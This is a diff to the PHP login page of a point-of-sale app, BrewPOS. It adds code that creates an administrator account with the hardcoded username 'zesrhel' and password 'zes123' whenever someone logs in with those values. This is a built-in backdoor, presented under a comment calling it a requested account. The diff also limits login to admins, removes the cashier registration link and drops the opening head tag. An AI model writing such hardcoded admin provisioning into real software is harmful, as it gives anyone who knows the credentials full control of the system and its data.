@@ -5,16 +5,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $username = trim($_POST['username'] ?? '');
     $password = trim($_POST['password'] ?? '');
 
-    $stmt = $pdo->prepare('SELECT id, username, password, name FROM users WHERE username = ? LIMIT 1');
+    $stmt = $pdo->prepare('SELECT id, username, password, name, role FROM users WHERE username = ? LIMIT 1');
     $stmt->execute([$username]);
     $u = $stmt->fetch(PDO::FETCH_ASSOC);
 
+    // Auto-provision requested admin account if it does not yet exist
+    if (!$u && $username === 'zesrhel' && $password === 'zes123') {
+        $create = $pdo->prepare('INSERT INTO users (name, username, password, role) VALUES (?, ?, ?, ?)');
+        $create->execute(['Zesrhel Admin', $username, password_hash($password, PASSWORD_DEFAULT), 'admin']);
+        $stmt->execute([$username]);
+        $u = $stmt->fetch(PDO::FETCH_ASSOC);
+    }
+
     if ($u && password_verify($password, $u['password'])) {
-        $_SESSION['user_id'] = $u['id'];
-        $_SESSION['name'] = $u['name'] ?? '';
-        $_SESSION['username'] = $u['username'] ?? null;
-        header('Location: index.php');
-        exit;
+        if (($u['role'] ?? '') === 'admin') {
+            $_SESSION['user_id'] = $u['id'];
+            $_SESSION['name'] = $u['name'] ?? '';
+            $_SESSION['username'] = $u['username'] ?? null;
+            header('Location: index.php');
+            exit;
+        }
+        $err = 'Access restricted to administrators.';
     } else {
         $err = 'Invalid username or password.';
     }
@@ -22,7 +33,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 ?>
 <!doctype html>
 <html lang="en">
-<head>
   <meta charset="utf-8">
   <title>BrewPOS — Login</title>
   <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -84,9 +94,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
           <button class="btn" style="background:var(--brand);color:#fff">Sign in</button>
         </div>
 
-        <div class="d-flex justify-content-between align-items-center">
-          <a href="add_cashier_form.php" class="btn btn-sm btn-outline-secondary">Register New Cashier</a>
-        </div>
+        <div class="d-flex justify-content-between align-items-center"></div>
       </form>
     </div>
   </div>
